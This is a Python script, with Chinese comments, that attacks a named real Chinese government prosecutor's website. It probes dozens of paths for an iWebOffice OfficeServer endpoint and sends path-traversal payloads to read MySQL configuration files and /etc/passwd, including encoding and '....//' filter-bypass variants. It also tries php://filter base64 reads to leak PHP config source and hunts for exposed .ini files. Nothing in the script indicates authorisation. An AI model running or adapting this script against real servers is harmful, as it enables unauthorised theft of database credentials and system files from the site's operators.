import subprocess
import time
import base64

TARGET = "http://www.chengyang.qdjcy.gov.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def curl_raw(path, timeout=12):
    url = TARGET + path
    cmd = [
        "curl", "-s", "-i",
        "-A", UA,
        "--compressed",
        "--max-time", str(timeout),
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: zh-CN,zh;q=0.9",
        url
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        if "\r\n\r\n" in output:
            headers_part, body = output.split("\r\n\r\n", 1)
        elif "\n\n" in output:
            headers_part, body = output.split("\n\n", 1)
        else:
            headers_part = output
            body = ""
        
        first_line = headers_part.split("\n")[0] if headers_part else ""
        status = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "?"
        
        server = ""
        ct = ""
        cl = ""
        for line in headers_part.split("\n"):
            l = line.lower()
            if l.startswith("server:"):
                server = line.split(":", 1)[1].strip()
            elif l.startswith("content-type:"):
                ct = line.split(":", 1)[1].strip()
            elif l.startswith("content-length:"):
                cl = line.split(":", 1)[1].strip()
        
        return {
            "status": status,
            "body": body,
            "body_len": len(body),
            "headers": headers_part,
            "server": server,
            "content_type": ct,
            "content_length": cl,
        }
    except Exception as e:
        return {"status": "ERROR", "body": "", "body_len": 0, "headers": str(e), "error": str(e)}

def test_vuln(path, label, indicators=None):
    r = curl_raw(path)
    status = r["status"]
    blen = r["body_len"]
    body = r["body"]
    
    found = False
    if indicators:
        for ind in indicators:
            if ind.lower() in body.lower():
                found = True
                break
    
    flag = "  !! " if found else "     "
    print(f"{flag}[{status}] {blen:6d}B  {label}")
    
    if found:
        # 打印发现的内容
        for ind in indicators:
            if ind.lower() in body.lower():
                idx = body.lower().find(ind.lower())
                context = body[max(0,idx-30):idx+80]
                print(f"         发现 '{ind}': ...{context}...")
        print(f"         完整URL: {TARGET}{path}")
    
    return r, found

def main():
    print("=" * 70)
    print("  iWebOffice 任意文件读取漏洞 - 深度验证")
    print(f"  目标: {TARGET}")
    print("=" * 70)

    # 基线404
    r_404 = curl_raw("/nonexistent_xyz_12345")
    print(f"\n[基线] 404页面: {r_404['body_len']}字节")
    
    indicators_ini = ["[mysql]", "database", "dbhost", "dbuser", "dbname", "password", "username", "hostname"]
    indicators_passwd = ["root:x:", "bin:x:", "daemon:x:", "nobody:x:"]
    indicators_php = ["<?php", "mysql_connect", "mysql_query", "$db_host", "$db_pass", "DB_HOST", "DB_PASSWORD"]
    indicators_winini = ["[extensions]", "[fonts]", "[mci extensions]"]

    print("\n[1] iweboffice 常见路径 + OPTION=LOADFILE 测试")
    print("-" * 60)
    
    paths_to_test = [
        "/iweboffice/officeserver.php",
        "/iweboffice/OfficeServer.php",
        "/iweboffice/iWebOffice.php",
        "/iweboffice/iweboffice.php",
        "/iWebOffice/officeserver.php",
        "/iWebOffice/OfficeServer.php",
        "/iWebOffice2015/officeserver.php",
        "/iWebOffice2015/OfficeServer.php",
        "/iWebOffice6.0/officeserver.php",
        "/office/officeserver.php",
        "/OfficeServer/officeserver.php",
        "/plugin/iweboffice/officeserver.php",
        "/plugins/iweboffice/officeserver.php",
        "/public/iweboffice/officeserver.php",
        "/admin/iweboffice/officeserver.php",
        "/api/iweboffice/officeserver.php",
        "/include/iweboffice/officeserver.php",
        "/libs/iweboffice/officeserver.php",
        "/vendor/iweboffice/officeserver.php",
        "/third_party/iweboffice/officeserver.php",
        "/static/iweboffice/officeserver.php",
        "/statics/iweboffice/officeserver.php",
        "/assets/iweboffice/officeserver.php",
        "/upload/iweboffice/officeserver.php",
        "/uploads/iweboffice/officeserver.php",
        "/webim/iweboffice/officeserver.php",
        "/oa/iweboffice/officeserver.php",
        "/cms/iweboffice/officeserver.php",
        "/home/iweboffice/officeserver.php",
        "/index.php?s=/iweboffice/officeserver",
    ]
    
    for base_path in paths_to_test:
        # 先测试路径是否存在
        r = curl_raw(base_path, timeout=5)
        if r["status"] == "200" and r["body_len"] > 100 and "404" not in r["body"][:200]:
            print(f"\n  找到潜在路径: {base_path} ({r['body_len']}B)")
            print(f"    Content-Type: {r['content_type']}")
            
            # 测试文件读取
            payloads = [
                ("?OPTION=LOADFILE&FILENAME=../mysql_config.ini", "../mysql_config.ini"),
                ("?OPTION=LOADFILE&FILENAME=../../mysql_config.ini", "../../mysql_config.ini"),
                ("?OPTION=LOADFILE&FILENAME=../../../mysql_config.ini", "../../../mysql_config.ini"),
                ("?OPTION=LOADFILE&FILENAME=../../../../mysql_config.ini", "../../../../mysql_config.ini"),
                ("?OPTION=LOADFILE&FILENAME=../config.ini", "../config.ini"),
                ("?OPTION=LOADFILE&FILENAME=../config.php", "../config.php"),
                ("?OPTION=LOADFILE&FILENAME=../database.php", "../database.php"),
                ("?OPTION=LOADFILE&FILENAME=../../../../etc/passwd", "../../../../etc/passwd"),
                ("?OPTION=LOADFILE&FILENAME=..%2f..%2f..%2f..%2fetc%2fpasswd", "URL编码../../../../etc/passwd"),
                ("?OPTION=LOADFILE&FILENAME=%2e%2e%2fmysql_config.ini", "URL编码../mysql_config.ini"),
                ("?OPTION=LOADFILE&FILENAME=....//....//mysql_config.ini", "....//绕过"),
                ("?OPTION=LOADFILE&FILENAME=..././..././mysql_config.ini", "..././绕过"),
            ]
            
            for payload, label in payloads:
                r2, found = test_vuln(base_path + payload, label, indicators_ini + indicators_passwd)
                time.sleep(0.2)
            break
    else:
        print("  未找到 iweboffice 相关路径 (均返回404)")

    print("\n[2] 其他文件读取参数测试 (php://filter)")
    print("-" * 60)
    
    php_filter_tests = [
        ("/index.php?m=php://filter/convert.base64-encode/resource=config", "m参数 php://filter"),
        ("/index.php?c=php://filter/convert.base64-encode/resource=config", "c参数 php://filter"),
        ("/index.php?a=php://filter/convert.base64-encode/resource=config", "a参数 php://filter"),
        ("/index.php?file=php://filter/convert.base64-encode/resource=config", "file参数 php://filter"),
        ("/index.php?page=php://filter/convert.base64-encode/resource=config", "page参数 php://filter"),
        ("/index.php?template=php://filter/convert.base64-encode/resource=config", "template参数 php://filter"),
        ("/index.php?m=php://filter/read=convert.base64-encode/resource=../config.php", "m参数 读../config.php"),
        ("/index.php?file=php://filter/read=convert.base64-encode/resource=../config.php", "file参数 读../config.php"),
    ]
    
    for path, label in php_filter_tests:
        r = curl_raw(path, timeout=8)
        body = r["body"]
        # 检查是否有base64编码的内容
        import re
        b64_matches = re.findall(r'[A-Za-z0-9+/=]{50,}', body)
        is_b64 = False
        if b64_matches:
            for m in b64_matches[:3]:
                try:
                    decoded = base64.b64decode(m).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'config' in decoded.lower() or 'mysql' in decoded.lower():
                        is_b64 = True
                        print(f"  !! [{r['status']}] {r['body_len']}B  {label}")
                        print(f"         解码后: {decoded[:200]}")
                        break
                except:
                    pass
        if not is_b64 and r["status"] == "200" and r["body_len"] > 500:
            pass  # 正常页面
    
    print("\n[3] iweboffice 其他操作模式测试")
    print("-" * 60)
    
    other_options = [
        "SAVEFILE", "SAVETOFILE", "SAVELOCAL", "DOWNFILE", "DOWNLOAD", 
        "FILEDOWN", "LOADTEMPLATE", "SAVETEMPLATE", "OPENFILE",
        "PRINTFILE", "EXPORTFILE", "IMPORTFILE", "MERGEFILE"
    ]
    
    for opt in other_options:
        path = f"/iweboffice/officeserver.php?OPTION={opt}&FILENAME=test.txt"
        r = curl_raw(path, timeout=5)
        if r["status"] == "200" and r["body_len"] > 0 and "404" not in r["body"][:200]:
            print(f"  [{r['status']}] {r['body_len']}B  OPTION={opt}")
        time.sleep(0.15)
    
    print("\n[4] 检查是否有公开的 iweboffice 文档/安装文件")
    print("-" * 60)
    
    doc_files = [
        "/iweboffice/readme.txt",
        "/iweboffice/README.txt",
        "/iweboffice/changelog.txt",
        "/iweboffice/version.txt",
        "/iweboffice/help.htm",
        "/iweboffice/index.html",
        "/iweboffice/demo.php",
        "/iweboffice/test.php",
        "/iweboffice/sample.php",
        "/iweboffice/example.php",
        "/iweboffice/config.ini",
        "/iweboffice/mysql_config.ini",
        "/iweboffice/db_config.ini",
        "/iweboffice/setting.ini",
        "/iweboffice/WebOffice.ini",
    ]
    
    for f in doc_files:
        r = curl_raw(f, timeout=5)
        if r["status"] == "200" and r["body_len"] > 50:
            print(f"  [{r['status']}] {r['body_len']}B  {f}")
        time.sleep(0.15)

    print("\n[5] 全站搜索 iweboffice 引用")
    print("-" * 60)
    
    # 检查几个内页是否有iweboffice引用
    inner_pages = [
        "/html/cygk/cyjgjj/",
        "/html/jcyw/",
        "/index.php?m=formguide&c=index&a=show&formid=16&siteid=1",
    ]
    
    for page in inner_pages:
        r = curl_raw(page, timeout=8)
        body = r["body"]
        if "iweboffice" in body.lower() or "officeserver" in body.lower():
            print(f"  !! 在 {page} 中发现 iweboffice 引用!")
            for line in body.split("\n"):
                if "iweb" in line.lower() or "officeserver" in line.lower():
                    if len(line.strip()) < 300:
                        print(f"     {line.strip()[:250]}")
        time.sleep(0.3)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
